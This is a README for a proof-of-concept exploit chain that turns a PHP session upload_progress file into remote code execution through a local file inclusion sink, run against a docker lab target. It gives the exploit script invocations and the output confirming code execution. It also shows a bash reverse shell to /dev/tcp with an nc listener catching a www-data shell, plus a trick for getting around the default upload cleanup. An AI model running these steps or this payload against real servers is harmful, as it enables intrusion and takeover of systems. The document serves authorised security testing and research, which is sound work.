# Phase A: session upload_progress to LFI

The why is in the root [README](../README.md). This folder builds the target and
runs the PoC. Authorised testing only.

Target: stock `php:8.4.26-apache` on `http://127.0.0.1:8080`, with an
`include($_GET['page'])` LFI sink at `/vuln.php`.

## Setup

    docker compose up --build -d

## Run

    python3 chain_a_session_lfi.py --target http://127.0.0.1:8080 \
        --lfi-path /vuln.php --session-path /tmp --command id --cleanup-on

You're after:

    [+] RCE CONFIRMED: uid=33(www-data) gid=33(www-data) groups=33(www-data)

`--cleanup-on` sends a stalled upload so the planted record survives the default
`session.upload_progress.cleanup=On`. Drop it only against a `cleanup=Off` box.

## Reverse shell

Start a listener (`nc -lvnp 4444`), then inject a bash reverse shell instead of a
command:

    python3 chain_a_session_lfi.py --target http://127.0.0.1:8080 \
        --lfi-path /vuln.php --session-path /tmp --lhost <LHOST> --lport 4444

The injected PHP runs a base64-wrapped `bash -i >& /dev/tcp/<LHOST>/<LPORT>`.
`<LHOST>` is your listener as seen from the container (the docker gateway, e.g.
`172.17.0.1`, or the host LAN IP).

## Output

Command mode:

```
$ python3 chain_a_session_lfi.py --target http://127.0.0.1:8080 --lfi-path /vuln.php --session-path /tmp --command id --cleanup-on
[attempt 1] SID=exploit9263a56b... file=/tmp/sess_exploit9263a56b...
[+] RCE CONFIRMED: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Reverse shell (listener in one terminal, exploit in another):

```
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 172.27.0.2 38944
www-data@e0953e99f708:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
```
$ python3 chain_a_session_lfi.py --target http://127.0.0.1:8080 --lfi-path /vuln.php --session-path /tmp --lhost 172.27.0.1 --lport 4444
[+] reverse shell fired via /tmp/sess_exploit9263a56b... -> 172.27.0.1:4444
```

## Teardown

    docker compose down
